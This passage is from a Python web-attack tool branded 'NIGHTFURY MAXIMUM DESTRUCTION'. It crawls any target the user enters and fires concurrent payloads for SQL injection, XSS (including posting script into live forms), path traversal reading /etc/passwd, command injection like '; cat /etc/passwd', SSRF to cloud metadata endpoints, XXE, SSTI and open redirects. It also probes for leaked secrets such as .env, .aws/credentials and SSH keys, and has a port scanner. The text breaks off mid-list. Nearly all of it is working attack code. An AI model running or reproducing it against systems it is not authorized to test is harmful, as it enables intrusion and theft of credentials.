                    url, params=params, headers=req_headers, cookies=cookies,
                    allow_redirects=allow_redirects, timeout=timeout
                )
            elif method.upper() == 'POST':
                r = self.session.post(
                    url, data=data, params=params, headers=req_headers,
                    cookies=cookies, allow_redirects=allow_redirects, timeout=timeout
                )
            else:
                return result
            
            result['success'] = True
            result['response'] = {
                'text': r.text,
                'content': r.content,
                'status': r.status_code,
                'headers': dict(r.headers),
                'url': r.url,
                'history': [h.url for h in r.history],
                'cookies': dict(r.cookies),
                'elapsed': r.elapsed.total_seconds()
            }
            
        except requests.exceptions.Timeout:
            result['error'] = 'Timeout'
            self.error_count += 1
        except requests.exceptions.ConnectionError:
            result['error'] = 'Connection Error'
            self.error_count += 1
        except Exception as e:
            result['error'] = str(e)
            self.error_count += 1
            
        return result
    
    def _concurrent_request(self, url_list, workers=None):
        if workers is None:
            workers = self.max_threads
        results = {}
        with ThreadPoolExecutor(max_workers=workers) as executor:
            fut_map = {executor.submit(self.request, url): url for url in url_list}
            for future in as_completed(fut_map):
                url = fut_map[future]
                try:
                    results[url] = future.result()
                except Exception as e:
                    results[url] = {'success': False, 'error': str(e)}
        return results
    
    def banner(self):
        """Display banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║{Fore.WHITE}              NIGHTFURY MAXIMUM DESTRUCTION v5.0              {Fore.RED}║
║{Fore.YELLOW}              INDUSTRIAL GRADE - 50+ METHODS                  {Fore.RED}║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║{Fore.CYAN}  • SQL Injection (14 types)    • XSS (8 types)               {Fore.RED}║
║{Fore.CYAN}  • LFI/RFI/Path Traversal      • Command Injection (6 types) {Fore.RED}║
║{Fore.CYAN}  • SSRF/XXE/SSTI               • NoSQL/LDAP/ORM/XPath        {Fore.RED}║
║{Fore.CYAN}  • IDOR/JWT/OAuth/Session      • CORS/CSRF/Clickjacking      {Fore.RED}║
║{Fore.CYAN}  • Header Injection/CRLF       • Open Redirect               {Fore.RED}║
║{Fore.CYAN}  • Port Scanner/Service Detect • Subdomain/Cloud Enum        {Fore.RED}║
║{Fore.CYAN}  • Sensitive Files/Backups     • CMS/Framework Fingerprint   {Fore.RED}║
║{Fore.CYAN}  • WAF Detection/Bypass        • Race Condition/Deserialize  {Fore.RED}║
║{Fore.CYAN}  • GraphQL/WebSocket           • Cache Poisoning/Smuggling   {Fore.RED}║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
"""
        print(banner)
        
    def get_target(self):
        """Get and validate target"""
        print(f"\n{Fore.YELLOW}[→] Enter target URL/IP: {Fore.RESET}", end="")
        self.target = input().strip()
        
        if not self.target:
            print(f"{Fore.RED}[✗] Target required!{Fore.RESET}")
            return False
        
        # Add protocol if missing
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        
        try:
            parsed = urlparse(self.target)
            self.base_url = f"{parsed.scheme}://{parsed.netloc}"
            self.domain = parsed.netloc
            
            # Resolve IP
            try:
                self.ip = socket.gethostbyname(self.domain.split(':')[0])
            except:
                self.ip = "Unknown"
            
            print(f"\n{Fore.GREEN}[✓] Target: {self.target}")
            print(f"[✓] Domain: {self.domain}")
            print(f"[✓] IP: {self.ip}")
            print(f"[✓] Base: {self.base_url}{Fore.RESET}")
            
            # Test connection
            print(f"\n{Fore.BLUE}[*] Testing connection...{Fore.RESET}", end="")
            result = self.request(self.target, timeout=5)
            if result['success']:
                resp = result['response']
                print(f" {Fore.GREEN}OK ({resp['status']}){Fore.RESET}")
                print(f"    Server: {resp['headers'].get('server', 'Unknown')}")
                print(f"    Technology: {resp['headers'].get('x-powered-by', 'Unknown')}")
            else:
                print(f" {Fore.RED}FAILED ({result['error']}){Fore.RESET}")
                print(f"{Fore.YELLOW}[!] Continuing anyway...{Fore.RESET}")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[✗] Error: {str(e)}{Fore.RESET}")
            return False
    
    def crawl(self):
        """Crawl target for endpoints"""
        print(f"\n{Fore.BLUE}[*] Crawling target for endpoints...{Fore.RESET}")
        
        to_visit = [self.target]
        visited = set()
        max_pages = 50
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            
            visited.add(url)
            print(f"  {Fore.CYAN}→ {url}{Fore.RESET}")
            
            result = self.request(url)
            if not result['success']:
                continue
            
            resp = result['response']
            
            # Parse HTML for links
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(resp['text'], 'html.parser')
                
                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('http'):
                        full_url = href
                    elif href.startswith('/'):
                        full_url = self.base_url + href
                    elif href.startswith('#'):
                        continue
                    else:
                        full_url = urljoin(url, href)
                    
                    if self.domain in full_url and full_url not in visited and full_url not in to_visit:
                        to_visit.append(full_url)
                
                # Extract forms
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    if not action:
                        action = url
                    elif not action.startswith('http'):
                        action = urljoin(url, action)
                    
                    method = form.get('method', 'get').lower()
                    inputs = []
                    
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if name:
                            inputs.append({
                                'name': name,
                                'type': inp.get('type', 'text'),
                                'value': inp.get('value', '')
                            })
                    
                    self.forms.append({
                        'action': action,
                        'method': method,
                        'inputs': inputs,
                        'source': url
                    })
                
                # Extract parameters from URL
                if '?' in url:
                    params = url.split('?')[1].split('&')
                    for param in params:
                        if '=' in param:
                            self.parameters.append(param.split('=')[0])
            
            except Exception as e:
                continue
        
        self.endpoints = list(visited)
        print(f"{Fore.GREEN}[✓] Found {len(self.endpoints)} endpoints")
        print(f"[✓] Found {len(self.forms)} forms")
        print(f"[✓] Found {len(set(self.parameters))} parameters{Fore.RESET}")
        
    # ==================== MODULE 1: SQL INJECTION (14 TYPES) ====================
    
    def test_sqli_error(self):
        """SQL Injection - Error Based"""
        results = []
        print(f"  {Fore.BLUE}[1/14] Testing Error-based SQLi...{Fore.RESET}")
        
        payloads = list(self._get_deep_payloads('sqli_error'))
        
        error_patterns = [
            'mysql_fetch', 'mysql_num_rows', 'mysql_error', 'MySQLSyntaxErrorException',
            'Incorrect syntax near', 'Unclosed quotation mark', 'You have an error in your SQL syntax',
            'Division by zero', 'Unknown column', 'Warning: mysql_', 'SQLite3::',
            'SQLSTATE', 'PostgreSQL', 'ORA-[0-9]', 'Microsoft OLE DB', 'ODBC Driver',
            'SQL Server', 'Syntax error in query', 'mysql_query()', 'mysqli_error()',
            'driver', 'db2', 'sqlite', 'oracle', 'postgres', 'mysql'
        ]
        
        test_tasks = []
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            base, query = endpoint.split('?', 1)
            params = parse_qs(query)
            for param in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                    test_tasks.append((test_url, param, payload))
        
        url_results = self._concurrent_request([t[0] for t in test_tasks])
        for test_url, param, payload in test_tasks:
            result = url_results.get(test_url)
            if not result or not result['success']:
                continue
            content = result['response']['text'].lower()
            for pattern in error_patterns:
                if pattern.lower() in content:
                    results.append({
                        'type': 'SQL Injection (Error Based)',
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'evidence': pattern
                    })
                    print(f"    {Fore.RED}⚠ Found: {param} with {payload[:30]}...{Fore.RESET}")
                    break
        
        return results
    
    def test_sqli_time(self):
        """SQL Injection - Time Based Blind"""
        results = []
        print(f"  {Fore.BLUE}[2/14] Testing Time-based Blind SQLi...{Fore.RESET}")
        
        payloads = list(self._get_deep_payloads('sqli_time'))
        
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            
            base, query = endpoint.split('?', 1)
            params = parse_qs(query)
            
            # Baseline
            bl_resp = self.request(endpoint)
            baseline = bl_resp['response']['elapsed'] if bl_resp['success'] else 0.5
            
            test_tasks = []
            for param in params:
                for payload, threshold in payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                    test_tasks.append((test_url, param, payload, threshold))
            
            url_results = self._concurrent_request([t[0] for t in test_tasks])
            for test_url, param, payload, threshold in test_tasks:
                result = url_results.get(test_url)
                if not result or not result['success']:
                    continue
                elapsed = result['response']['elapsed']
                if elapsed > baseline + threshold:
                    results.append({
                        'type': 'SQL Injection (Time Based)',
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'delay': f"{elapsed:.2f}s"
                    })
                    print(f"    {Fore.RED}⚠ Found: {param} time-based ({elapsed:.2f}s){Fore.RESET}")
                    break
        
        return results
    
    def test_sqli_boolean(self):
        """SQL Injection - Boolean Based Blind"""
        results = []
        print(f"  {Fore.BLUE}[3/14] Testing Boolean-based Blind SQLi...{Fore.RESET}")
        
        boolean_pairs = list(self._get_deep_payloads('sqli_boolean'))
        
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            
            base, query = endpoint.split('?', 1)
            params = parse_qs(query)
            
            true_tasks = []
            false_tasks = []
            for param in params:
                for true_payload, false_payload in boolean_pairs:
                    tp = params.copy()
                    tp[param] = [true_payload]
                    true_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
                    tp[param] = [false_payload]
                    false_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
                    true_tasks.append((true_url, param, true_payload, false_payload))
                    false_tasks.append((false_url, param, true_payload, false_payload))
            
            all_urls = [t[0] for t in true_tasks] + [t[0] for t in false_tasks]
            url_results = self._concurrent_request(list(set(all_urls)))
            
            for (true_url, param, true_payload, false_payload), (false_url, _, _, _) in zip(true_tasks, false_tasks):
                true_result = url_results.get(true_url)
                false_result = url_results.get(false_url)
                if not true_result or not true_result['success']:
                    continue
                if not false_result or not false_result['success']:
                    continue
                true_len = len(true_result['response']['text'])
                false_len = len(false_result['response']['text'])
                if abs(true_len - false_len) > 50:
                    results.append({
                        'type': 'SQL Injection (Boolean Based)',
                        'url': endpoint,
                        'param': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'diff': abs(true_len - false_len)
                    })
                    print(f"    {Fore.RED}⚠ Found: {param} boolean-based{Fore.RESET}")
                    break
        
        return results
    
    def test_sqli_union(self):
        """SQL Injection - Union Based"""
        results = []
        print(f"  {Fore.BLUE}[4/14] Testing Union-based SQLi...{Fore.RESET}")
        
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            
            try:
                base, query = endpoint.split('?', 1)
                params = parse_qs(query)
                
                for param in params:
                    # Test column count
                    for i in range(1, 10):
                        payload = f"' UNION SELECT {','.join(['NULL']*i)}--"
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                        
                        result = self.request(test_url)
                        if not result['success']:
                            continue
                        
                        # Check for successful union
                        if 'column' not in result['response']['text'].lower() and \
                           'union' not in result['response']['text'].lower():
                            results.append({
                                'type': 'SQL Injection (Union Based)',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'columns': i
                            })
                            print(f"    {Fore.RED}⚠ Found: {param} union-based ({i} columns){Fore.RESET}")
                            break
            except:
                continue
        
        return results
    
    # ==================== MODULE 2: XSS (8 TYPES) ====================
    
    def test_xss_reflected(self):
        """XSS - Reflected"""
        results = []
        print(f"  {Fore.BLUE}[5/14] Testing Reflected XSS...{Fore.RESET}")
        
        payloads = list(self._get_deep_payloads('xss')) + [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<a href=\"javascript:alert(1)\">click</a>",
            "';alert(1);//",
            "\";alert(1);//",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "<!--><script>alert(1)</script>",
            "<sc<script>ript>alert(1)</sc</script>ript>",
        ]
        
        test_tasks = []
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            base, query = endpoint.split('?', 1)
            params = parse_qs(query)
            for param in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                    test_tasks.append((test_url, param, payload))
        
        url_results = self._concurrent_request([t[0] for t in test_tasks])
        for test_url, param, payload in test_tasks:
            result = url_results.get(test_url)
            if not result or not result['success']:
                continue
            if payload in result['response']['text']:
                results.append({
                    'type': 'Reflected XSS',
                    'url': test_url,
                    'param': param,
                    'payload': payload
                })
                print(f"    {Fore.RED}⚠ Found: {param} XSS{Fore.RESET}")
                break
        
        return results
    
    def test_xss_stored(self):
        """XSS - Stored (via forms)"""
        results = []
        print(f"  {Fore.BLUE}[6/14] Testing Stored XSS...{Fore.RESET}")
        
        payload = "<script>alert('XSS')</script>"
        
        for form in self.forms:
            if form['method'] != 'post':
                continue
            
            try:
                data = {}
                for inp in form['inputs']:
                    if inp['name']:
                        if inp['type'] in ['text', 'textarea', 'search']:
                            data[inp['name']] = payload
                        else:
                            data[inp['name']] = inp['value'] or 'test'
                
                if data:
                    result = self.request(form['action'], method='POST', data=data)
                    
                    # Check if payload stored and reflected
                    if result['success']:
                        # Visit page again to check stored XSS
                        time.sleep(1)
                        check = self.request(form['source'])
                        if check['success'] and payload in check['response']['text']:
                            results.append({
                                'type': 'Stored XSS',
                                'url': form['source'],
                                'form_action': form['action'],
                                'payload': payload
                            })
                            print(f"    {Fore.RED}⚠ Found: Stored XSS in form{Fore.RESET}")
            except:
                continue
        
        return results
    
    def test_xss_dom(self):
        """XSS - DOM Based"""
        results = []
        print(f"  {Fore.BLUE}[7/14] Testing DOM-based XSS...{Fore.RESET}")
        
        payloads = [
            "#<script>alert(1)</script>",
            "javascript:alert(1)//",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
        ]
        
        for endpoint in self.endpoints:
            try:
                for payload in payloads:
                    test_url = endpoint + payload
                    result = self.request(test_url)
                    
                    # Check for DOM sinks
                    if result['success']:
                        content = result['response']['text'].lower()
                        dom_sinks = ['document.write', 'innerhtml', 'outerhtml', 
                                    'eval(', 'settimeout', 'setinterval']
                        
                        for sink in dom_sinks:
                            if sink in content:
                                results.append({
                                    'type': 'Potential DOM XSS',
                                    'url': test_url,
                                    'payload': payload,
                                    'sink': sink
                                })
                                print(f"    {Fore.YELLOW}⚠ Found: DOM sink {sink}{Fore.RESET}")
                                break
            except:
                continue
        
        return results
    
    # ==================== MODULE 3: LFI/RFI/Path Traversal ====================
    
    def test_lfi(self):
        """Local File Inclusion"""
        results = []
        print(f"  {Fore.BLUE}[8/14] Testing LFI/RFI/Path Traversal...{Fore.RESET}")
        
        payloads = list(self._get_deep_payloads('lfi')) + [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../windows/win.ini",
            "/var/www/html/config.php",
            "/etc/hosts",
            "/proc/self/environ",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]
        
        indicators = [
            ("root:x:", "Unix password file"),
            ("[extensions]", "Windows config"),
            ("<?php", "PHP source"),
            ("DB_HOST", "Database config"),
            ("localhost", "Hosts file"),
            ("HTTP_USER_AGENT", "Environment"),
            ("mysql", "SQL config"),
            ("password", "Credentials")
        ]
        
        test_tasks = []
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            base, query = endpoint.split('?', 1)
            params = parse_qs(query)
            for param in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                    test_tasks.append((test_url, param, payload))
        
        url_results = self._concurrent_request([t[0] for t in test_tasks])
        for test_url, param, payload in test_tasks:
            result = url_results.get(test_url)
            if not result or not result['success']:
                continue
            content = result['response']['text']
            for indicator, desc in indicators:
                if indicator in content:
                    results.append({
                        'type': 'Local File Inclusion',
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'evidence': desc
                    })
                    print(f"    {Fore.RED}⚠ Found: {param} LFI ({desc}){Fore.RESET}")
                    break
        
        return results
    
    # ==================== MODULE 4: Command Injection ====================
    
    def test_cmdi(self):
        """Command Injection"""
        results = []
        print(f"  {Fore.BLUE}[9/14] Testing Command Injection...{Fore.RESET}")
        
        # Time-based payloads
        time_payloads = [
            ("; sleep 5", 4),
            ("| sleep 5", 4),
            ("|| sleep 5", 4),
            ("& sleep 5", 4),
            ("&& sleep 5", 4),
            ("`sleep 5`", 4),
            ("$(sleep 5)", 4),
            ("; ping -c 5 127.0.0.1", 4),
            ("| ping -n 5 127.0.0.1", 4),
            ("& ping -i 5 127.0.0.1 &", 4)
        ]
        
        # Output-based payloads
        output_payloads = [
            ("; echo vulnerable", "vulnerable"),
            ("| echo vulnerable", "vulnerable"),
            ("`echo vulnerable`", "vulnerable"),
            ("$(echo vulnerable)", "vulnerable"),
            ("; whoami", "root", "admin", "user"),
            ("| whoami", "root", "admin", "user"),
            ("; id", "uid=", "gid="),
            ("| dir", "Volume", "Directory"),
            ("; ls", "etc", "home", "var"),
            ("; cat /etc/passwd", "root:x:")
        ]
        
        time_tasks = []
        output_tasks = []
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            base, query = endpoint.split('?', 1)
            params = parse_qs(query)
            
            # Baseline for time-based
            bl = self.request(endpoint)
            baseline = bl['response']['elapsed'] if bl['success'] else 0.3
            
            for param in params:
                for payload, threshold in time_payloads:
                    tp = params.copy()
                    tp[param] = [payload]
                    u = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
                    time_tasks.append((u, param, payload, threshold))
                
                for payload, *indicators in output_payloads:
                    tp = params.copy()
                    tp[param] = [payload]
                    u = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
                    output_tasks.append((u, param, payload, indicators))
        
        time_results = self._concurrent_request([t[0] for t in time_tasks])
        for url, param, payload, threshold in time_tasks:
            r = time_results.get(url)
            if r and r['success'] and r['response']['elapsed'] > baseline + threshold:
                results.append({
                    'type': 'Command Injection (Time Based)',
                    'url': url, 'param': param, 'payload': payload,
                    'delay': f"{r['response']['elapsed']:.2f}s"
                })
                print(f"    {Fore.RED}⚠ Found: {param} time-based cmd injection{Fore.RESET}")
                break
        
        out_results = self._concurrent_request([t[0] for t in output_tasks])
        for url, param, payload, indicators in output_tasks:
            r = out_results.get(url)
            if not r or not r['success']:
                continue
            content = r['response']['text'].lower()
            for ind in indicators:
                if isinstance(ind, str) and ind.lower() in content:
                    results.append({
                        'type': 'Command Injection',
                        'url': url, 'param': param, 'payload': payload,
                        'evidence': ind
                    })
                    print(f"    {Fore.RED}⚠ Found: {param} cmd injection{Fore.RESET}")
                    break
        
        return results
    
    # ==================== MODULE 5: SSRF ====================
    
    def test_ssrf(self):
        """Server Side Request Forgery"""
        results = []
        print(f"  {Fore.BLUE}[10/14] Testing SSRF...{Fore.RESET}")
        
        payloads = [
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:9200",
            "http://localhost:80",
            "http://localhost:443",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "file:///etc/passwd",
            "gopher://localhost:8080",
            "dict://localhost:11211",
            "ftp://localhost:21"
        ]
        
        indicators = [
            "root:x:", "aws", "meta-data", "ssh", "mysql", 
            "postgres", "redis", "elastic", "ubuntu"
        ]
        
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            
            try:
                base, query = endpoint.split('?', 1)
                params = parse_qs(query)
                
                for param in params:
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                        
                        result = self.request(test_url)
                        if not result['success']:
                            continue
                        
                        content = result['response']['text']
                        
                        for indicator in indicators:
                            if indicator in content:
                                results.append({
                                    'type': 'SSRF',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': indicator
                                })
                                print(f"    {Fore.RED}⚠ Found: {param} SSRF{Fore.RESET}")
                                break
            except:
                continue
        
        return results
    
    # ==================== MODULE 6: XXE ====================
    
    def test_xxe(self):
        """XML External Entity"""
        results = []
        print(f"  {Fore.BLUE}[11/14] Testing XXE...{Fore.RESET}")
        
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "file:///etc/passwd">%test;]>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://localhost:80/xxe.dtd">%remote;]>'
        ]
        
        for form in self.forms:
            if form['method'] != 'post':
                continue
            
            try:
                for payload in payloads:
                    headers = {'Content-Type': 'application/xml'}
                    result = self.request(form['action'], method='POST', data=payload, headers=headers)
                    
                    if result['success'] and 'root:x:' in result['response']['text']:
                        results.append({
                            'type': 'XXE',
                            'url': form['action'],
                            'payload': payload[:50] + '...'
                        })
                        print(f"    {Fore.RED}⚠ Found: XXE vulnerability{Fore.RESET}")
                        break
            except:
                continue
        
        return results
    
    # ==================== MODULE 7: SSTI ====================
    
    def test_ssti(self):
        """Server Side Template Injection"""
        results = []
        print(f"  {Fore.BLUE}[12/14] Testing SSTI...{Fore.RESET}")
        
        payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("<%= 7*7 %>", "49"),
            ("{{config}}", "config"),
            ("{{self.__class__.__mro__}}", "__mro__"),
            ("${7*7}", "49"),
            ("*{7*7}", "49"),
            ("{{7*7}}", "49"),
            ("{{7*'7'}}", "7777777")
        ]
        
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            
            try:
                base, query = endpoint.split('?', 1)
                params = parse_qs(query)
                
                for param in params:
                    for payload, expected in payloads:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                        
                        result = self.request(test_url)
                        if not result['success']:
                            continue
                        
                        if expected in result['response']['text']:
                            results.append({
                                'type': 'SSTI',
                                'url': test_url,
                                'param': param,
                                'payload': payload
                            })
                            print(f"    {Fore.RED}⚠ Found: {param} SSTI{Fore.RESET}")
                            break
            except:
                continue
        
        return results
    
    # ==================== MODULE 8: Open Redirect ====================
    
    def test_redirect(self):
        """Open Redirect"""
        results = []
        print(f"  {Fore.BLUE}[13/14] Testing Open Redirect...{Fore.RESET}")
        
        redirect_params = [
            'redirect', 'url', 'next', 'return', 'returnTo', 'return_url',
            'dest', 'destination', 'redir', 'redirect_uri', 'continue',
            'continue_to', 'goto', 'callback', 'out', 'view', 'dir',
            'file', 'document', 'location', 'path', 'load', 'u', 'link'
        ]
        
        payloads = [
            'http://evil.com',
            '//evil.com',
            'https://google.com',
            '//google.com',
            '////evil.com',
            'https://evil.com@google.com'
        ]
        
        for endpoint in self.endpoints:
            if '?' not in endpoint:
                continue
            
            try:
                base, query = endpoint.split('?', 1)
                params = parse_qs(query)
                
                for param in params:
                    if param.lower() in redirect_params:
                        for payload in payloads:
                            test_params = params.copy()
                            test_params[param] = [payload]
                            test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
                            
                            result = self.request(test_url, allow_redirects=False)
                            if not result['success']:
                                continue
                            
                            if result['response']['status'] in [301, 302, 303, 307, 308]:
                                location = result['response']['headers'].get('location', '')
                                if 'evil.com' in location or 'google.com' in location:
                                    results.append({
                                        'type': 'Open Redirect',
                                        'url': test_url,
                                        'param': param,
                                        'redirects_to': location
                                    })
                                    print(f"    {Fore.YELLOW}⚠ Found: {param} open redirect{Fore.RESET}")
                                    break
            except:
                continue
        
        return results
    
    # ==================== MODULE 9: Sensitive Files ====================
    
    def test_sensitive(self):
        """Sensitive Files"""
        results = []
        print(f"  {Fore.BLUE}[14/14] Scanning sensitive files...{Fore.RESET}")
        
        files = [
            # Config files
            "/.env", "/.env.local", "/.env.production", "/.env.development",
            "/.git/config", "/.git/HEAD", "/.svn/entries", "/.svn/wc.db",
            "/.hg/hgrc", "/.bzr/README", "/.idea/workspace.xml",
            
            # Backups
            "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sql",
            "/database.sql", "/dump.sql", "/dump.rdb", "/mongodump",
            "/backup.mysql", "/backup.postgres", "/backup.db",
            
            # Web configs
            "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
            "/config.php", "/config.php.bak", "/configuration.php",
            "/settings.php", "/config.inc.php", "/config.inc",
            "/web.config", "/web.config.bak", "/.htaccess", "/.htpasswd",
            
            # System files
            "/phpinfo.php", "/info.php", "/php.php", "/test.php",
            "/php.ini", "/php.ini.bak", "/.bash_history", "/.mysql_history",
            "/.psql_history", "/.rediscli_history", "/.viminfo",
            
            # Logs
            "/error_log", "/debug.log", "/application.log", "/server.log",
            "/access.log", "/error.log", "/install.log", "/setup.log",
            
            # Source code
            "/source.zip", "/src.zip", "/code.zip", "/www.zip",
            "/website.zip", "/site.zip", "/public.zip",
            
            # API docs
            "/swagger.json", "/swagger.yaml", "/openapi.json",
            "/api-docs", "/docs", "/graphql", "/graphiql",
            
            # AWS/Cloud
            "/.aws/credentials", "/aws.json", "/aws.yml",
            "/credentials.json", "/credentials.yml",
            
            # SSH keys
            "/id_rsa", "/id_dsa", "/.ssh/id_rsa", "/.ssh/id_dsa",
            "/.ssh/authorized_keys", "/.ssh/config",
            
            # Database dumps
            "/mysql.sql", "/postgres.sql", "/mongo.dump", "/redis.rdb",
            "/data.sql", "/db_backup.sql", "/backup.mysql.gz"
        ]
        
        # Gunakan threading untuk speed
        def check_file(file_path):
            test_url = self.base_url + file_path
            result = self.request(test_url)
            
            if result['success'] and result['response']['status'] == 200:
                content = result['response']['text']
                size = len(content)
                
                # Skip jika terlalu kecil (redirect page)
                if size < 50:
                    return None
                
                # Check for sensitive content
                sensitive_patterns = [
                    ("DB_", "Database config"),
                    ("PASSWORD", "Password"),
                    ("SECRET", "Secret"),
                    ("API_KEY", "API key"),
                    ("PRIVATE KEY", "Private key"),
                    ("root:x:", "Passwd file"),
                    ("<?php", "PHP code"),
                    ("[mysql]", "MySQL config"),
                    ("AWS_", "AWS key")
                ]
                
                found_patterns = []
                for pattern, desc in sensitive_patterns:
                    if pattern in content:
                        found_patterns.append(desc)
                
                return {
                    'type': 'Sensitive File',
                    'url': test_url,
                    'size': size,
                    'patterns': found_patterns
                }
            return None
        
        # Threaded scanning
        threads = []
        results_lock = threading.Lock()
        
        def worker(file_path):
            res = check_file(file_path)
            if res:
                with results_lock:
                    results.append(res)
                    patterns = ", ".join(res['patterns']) if res['patterns'] else "Unknown"
                    print(f"    {Fore.YELLOW}⚠ Found: {file_path} ({res['size']} bytes){Fore.RESET}")
        
        for f in files:
            t = threading.Thread(target=worker, args=(f,))
            threads.append(t)
            t.start()
            
            # Limit concurrent threads
            while len([t for t in threads if t.is_alive()]) >= self.max_threads:
                time.sleep(0.1)
        
        for t in threads:
            t.join()
        
        return results
    
    # ==================== MODULE 10: Port Scanner ====================
    
    def scan_ports(self):
        """Port Scanner"""
        print(f"\n{Fore.BLUE}[*] Scanning ports...{Fore.RESET}")
        results = []
        
        ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 81: 'HTTP-Alt', 110: 'POP3', 111: 'RPC', 135: 'RPC',
            139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 465: 'SMTPS',
            514: 'Syslog', 587: 'SMTP', 993: 'IMAPS', 995: 'POP3S', 1080: 'SOCKS',
            1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP', 2049: 'NFS', 2082: 'cPanel',
            2083: 'cPanel SSL', 2086: 'WHM', 2087: 'WHM SSL', 2095: 'Webmail',
            2096: 'Webmail SSL', 3306: 'MySQL', 3389: 'RDP', 3690: 'SVN', 4444: 'Metasploit',
            5432: 'PostgreSQL', 5800: 'VNC', 5900: 'VNC', 5984: 'CouchDB',
            6379: 'Redis', 6667: 'IRC', 6668: 'IRC', 6669: 'IRC', 7001: 'WebLogic',
            8000: 'HTTP-Alt', 8001: 'HTTP-Alt', 8008: 'HTTP-Alt', 8009: 'AJP',
            8010: 'HTTP-Alt', 8080: 'HTTP-Alt', 8081: 'HTTP-Alt', 8088: 'HTTP-Alt',
            8090: 'HTTP-Alt', 8118: 'Privoxy', 8140: 'Puppet', 8181: 'HTTP-Alt',
            8200: 'HTTP-Alt', 8222: 'HTTP-Alt', 8333: 'Bitcoin', 8400: 'HTTP-Alt',
            8443: 'HTTPS-Alt', 8888: 'HTTP-Alt', 9000: 'HTTP-Alt', 9042: 'Cassandra',
